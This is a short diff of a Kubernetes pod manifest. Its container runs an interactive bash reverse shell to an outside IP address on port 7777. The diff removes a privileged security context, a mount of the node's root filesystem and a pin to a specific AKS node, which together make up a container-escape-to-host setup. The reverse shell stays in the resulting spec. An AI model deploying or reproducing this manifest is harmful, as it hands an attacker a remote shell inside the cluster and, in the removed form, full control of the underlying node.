@@ -32,14 +32,5 @@ spec:
     image: ubuntu
     command: ["/bin/bash", "-c", "--"]
     args: ["bash -i >& /dev/tcp/4.242.16.43/7777 0>&1"]
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - mountPath: /host
-      name: noderoot
-  nodeName: aks-userpool-01500227-vmss000000
-  volumes:
-    - name: noderoot
-      hostPath:
-        path: /
+    
     
